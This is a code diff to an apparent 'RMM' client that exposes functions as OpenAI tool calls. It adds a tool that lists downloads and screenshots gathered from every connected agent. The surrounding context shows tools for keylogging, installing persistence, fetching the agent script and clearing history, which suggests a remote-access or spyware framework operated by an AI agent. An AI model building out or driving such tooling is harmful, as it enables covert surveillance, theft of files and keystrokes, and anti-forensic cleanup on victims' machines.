@@ -508,6 +508,27 @@ def tool_list_session_downloads(client: RmmApiClient, session_ref: str) -> str:
     })
 
 
+def tool_list_artifacts(client: RmmApiClient, kind: str = "downloads") -> str:
+    """List global downloads or screenshots with their originating agents."""
+    normalized = (kind or "downloads").strip().lower()
+    if normalized not in {"downloads", "screenshots"}:
+        return _json_result({
+            "ok": False,
+            "error": "invalid_artifact_kind",
+            "detail": "kind must be downloads or screenshots",
+        })
+    code, data = client.list_artifacts(normalized)
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    artifacts = data.get("artifacts", [])
+    return _json_result({
+        "ok": True,
+        "kind": normalized,
+        "count": len(artifacts),
+        "artifacts": artifacts,
+    })
+
+
 def tool_get_agent_script(client: RmmApiClient) -> str:
     code, data = client.get_agent_script()
     if code != 200:
@@ -623,6 +644,7 @@ TOOL_HANDLERS = {
     "delete_history": lambda c, a: tool_delete_history(c, a["session_ref"]),
     "clear_history": lambda c, a: tool_clear_history(c),
     "list_session_downloads": lambda c, a: tool_list_session_downloads(c, a["session_ref"]),
+    "list_artifacts": lambda c, a: tool_list_artifacts(c, a.get("kind", "downloads")),
     "get_agent_script": lambda c, a: tool_get_agent_script(c),
     "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
     "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
@@ -1122,6 +1144,23 @@ OPENAI_TOOLS: list[dict] = [
                 "type": "object",
                 "properties": {"session_ref": {"type": "string"}},
                 "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "list_artifacts",
+            "description": "List downloads or screenshots from every agent with originating agent metadata.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "kind": {
+                        "type": "string",
+                        "enum": ["downloads", "screenshots"],
+                        "description": "Artifact collection to list (default downloads).",
+                    },
+                },
             },
         },
     },
